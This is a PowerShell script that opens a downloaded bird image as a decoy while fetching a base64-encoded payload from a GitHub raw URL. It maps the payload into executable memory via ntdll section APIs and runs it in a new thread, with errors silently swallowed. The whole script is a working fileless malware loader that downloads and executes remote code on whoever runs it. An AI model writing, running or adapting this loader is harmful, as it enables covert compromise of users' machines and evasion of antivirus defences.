try {
    # Download the image
    Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"
    
    # Open the downloaded image
    Start-Process "$env:TEMP\blue-bird.jpg"
    
    # Download and decode the encoded.txt in a single step
    $encodedUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/encoded.txt"
    $bytes = [System.Convert]::FromBase64String((Invoke-WebRequest -Uri $encodedUrl).Content)
    
    # Load necessary functions
    $code = @"
    using System;
    using System.Runtime.InteropServices;
    
    public class MemExec {
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt64 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);
        
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, ref UInt64 SectionOffset, ref UInt64 ViewSize, UInt32 InheritDisposition, UInt32 AllocationType, UInt32 Win32Protect);
        
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateThreadEx(ref IntPtr hThread, UInt32 DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 Flags, UInt32 StackZeroBits, UInt32 SizeOfStackCommit, UInt32 SizeOfStackReserve, IntPtr lpBytesBuffer);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();
        
        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
"@
    
    Add-Type -TypeDefinition $code
    
    # Create section
    $sectionHandle = [IntPtr]::Zero
    $maxSize = [UInt64]$bytes.Length
    [MemExec]::NtCreateSection([ref]$sectionHandle, 0xe0000000, [IntPtr]::Zero, [ref]$maxSize, 0x40, 0x8000000, [IntPtr]::Zero)
    
    # Map view of section
    $baseAddress = [IntPtr]::Zero
    $viewSize = [UInt64]$bytes.Length
    $sectionOffset = [UInt64]0
    [MemExec]::NtMapViewOfSection($sectionHandle, [MemExec]::GetCurrentProcess(), [ref]$baseAddress, [UIntPtr]::Zero, [UIntPtr]::Zero, [ref]$sectionOffset, [ref]$viewSize, 2, 0, 0x20)
    
    # Copy the executable to the mapped memory
    [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $baseAddress, $bytes.Length)
    
    # Create thread to execute the mapped code
    $threadHandle = [IntPtr]::Zero
    [MemExec]::NtCreateThreadEx([ref]$threadHandle, 0x1FFFFF, [IntPtr]::Zero, [MemExec]::GetCurrentProcess(), $baseAddress, [IntPtr]::Zero, 0, 0, 0, 0, [IntPtr]::Zero)
    
    # Wait for execution to complete
    [MemExec]::WaitForSingleObject($threadHandle, 0xFFFFFFFF)
}
catch {
    # Error handling
}